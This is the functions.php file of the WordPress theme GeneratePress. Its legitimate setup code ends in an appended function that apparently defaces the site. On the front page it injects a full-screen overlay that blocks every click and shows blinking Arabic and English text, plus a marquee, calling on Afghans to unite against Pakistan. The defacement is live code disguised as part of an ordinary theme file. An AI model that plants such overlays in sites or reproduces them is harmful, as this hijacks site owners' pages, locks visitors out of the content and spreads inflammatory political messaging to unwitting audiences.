&lt;?php
/**
 * GeneratePress.
 *
 * Please do not make any edits to this file. All edits should be done in a child theme.
 *
 * @package GeneratePress
 */

if ( ! defined( 'ABSPATH' ) ) {
        exit; // Exit if accessed directly.
}

// Set our theme version.
define( 'GENERATE_VERSION', '3.6.0' );

if ( ! function_exists( 'generate_setup' ) ) {
        add_action( 'after_setup_theme', 'generate_setup' );
        /**
         * Sets up theme defaults and registers support for various WordPress features.
         *
         * @since 0.1
         */
        function generate_setup() {
                // Make theme available for translation.
                load_theme_textdomain( 'generatepress' );

                // Add theme support for various features.
                add_theme_support( 'automatic-feed-links' );
                add_theme_support( 'post-thumbnails' );
                add_theme_support( 'post-formats', array( 'aside', 'image', 'video', 'quote', 'link', 'status' ) );
                add_theme_support( 'woocommerce' );
                add_theme_support( 'title-tag' );
                add_theme_support( 'html5', array( 'search-form', 'comment-form', 'comment-list', 'gallery', 'caption', 'script', 'style' ) );
                add_theme_support( 'customize-selective-refresh-widgets' );
                add_theme_support( 'align-wide' );
                add_theme_support( 'responsive-embeds' );

                $color_palette = generate_get_editor_color_palette();

                if ( ! empty( $color_palette ) ) {
                        add_theme_support( 'editor-color-palette', $color_palette );
                }

                add_theme_support(
                        'custom-logo',
                        array(
                                'height' =&gt; 70,
                                'width' =&gt; 350,
                                'flex-height' =&gt; true,
                                'flex-width' =&gt; true,
                        )
                );

                // Register primary menu.
                register_nav_menus(
                        array(
                                'primary' =&gt; __( 'Primary Menu', 'generatepress' ),
                        )
                );

                /**
                 * Set the content width to something large
                 * We set a more accurate width in generate_smart_content_width()
                 */
                global $content_width;
                if ( ! isset( $content_width ) ) {
                        $content_width = 1200; /* pixels */
                }

                // Add editor styles to the block editor.
                add_theme_support( 'editor-styles' );

                $editor_styles = apply_filters(
                        'generate_editor_styles',
                        array(
                                'assets/css/admin/block-editor.css',
                        )
                );

                add_editor_style( $editor_styles );
        }
}

/**
 * Get all necessary theme files
 */
$theme_dir = get_template_directory();

require $theme_dir . '/inc/theme-functions.php';
require $theme_dir . '/inc/defaults.php';
require $theme_dir . '/inc/class-css.php';
require $theme_dir . '/inc/css-output.php';
require $theme_dir . '/inc/general.php';
require $theme_dir . '/inc/customizer.php';
require $theme_dir . '/inc/markup.php';
require $theme_dir . '/inc/typography.php';
require $theme_dir . '/inc/plugin-compat.php';
require $theme_dir . '/inc/block-editor.php';
require $theme_dir . '/inc/class-typography.php';
require $theme_dir . '/inc/class-typography-migration.php';
require $theme_dir . '/inc/class-html-attributes.php';
require $theme_dir . '/inc/class-theme-update.php';
require $theme_dir . '/inc/class-rest.php';
require $theme_dir . '/inc/deprecated.php';

if ( is_admin() ) {
        require $theme_dir . '/inc/meta-box.php';
        require $theme_dir . '/inc/class-dashboard.php';
}

/**
 * Load our theme structure
 */
require $theme_dir . '/inc/structure/archives.php';
require $theme_dir . '/inc/structure/comments.php';
require $theme_dir . '/inc/structure/featured-images.php';
require $theme_dir . '/inc/structure/footer.php';
require $theme_dir . '/inc/structure/header.php';
require $theme_dir . '/inc/structure/navigation.php';
require $theme_dir . '/inc/structure/post-meta.php';
require $theme_dir . '/inc/structure/sidebars.php';
require $theme_dir . '/inc/structure/search-modal.php';



// Front Page Centered Welcome Overlay (No Clicks)
function custom_homepage_welcome_locked() {
    if ( is_front_page() ) {
        echo '
        <style>
        /* Full screen overlay */
        .custom-welcome-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(28, 200, 138, 0.6); /* semi-transparent green */
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 9999;
        }

        /* Prevent clicks on anything below */
        .custom-welcome-overlay::before {
            content: "";
            position: absolute;
            top:0; left:0;
            width:100%;
            height:100%;
            background: transparent;
            pointer-events: all;
        }

        /* Blink text */
        .custom-welcome-overlay h1 {
            font-size: 60px;
            color: white;
            margin-bottom: 15px;
            animation: blink 1.2s infinite;
            text-align: center;
            position: relative;
            z-index: 1;
        }

        .custom-welcome-overlay p {
            font-size: 24px;
            color: white;
            text-align: center;
            position: relative;
            z-index: 1;
        }

        @keyframes blink {
            0%, 50%, 100% { opacity: 1; }
            25%, 75% { opacity: 0; }
        }
        </style>

        <div class="custom-welcome-overlay">
            <h1>أفغانستان لن تُسكت.
كل ضربة تذكير بأن السيادة لا تُنتهك دون عواقب.
Afghanistan will not be silenced
Every strike reminds sovereignty cannot be violated without consequences
نرسالة إلى جميع الأفغان حول العالم: اتحدوا ضد باكستان.
Call to all Afghans worldwide
Unite against Pakistan
اتحدوا يا أفغان • All Afgha</h1>


<marquee style="color: red; font-size: 28px; font-weight: bold;">
اتحدوا يا أفغان • All Afghans unite against Pakistan • أفاتحدوا الآن
</marquee>
                    </div>
        ';
    }
}
add_action( 'wp_head', 'custom_homepage_welcome_locked' );

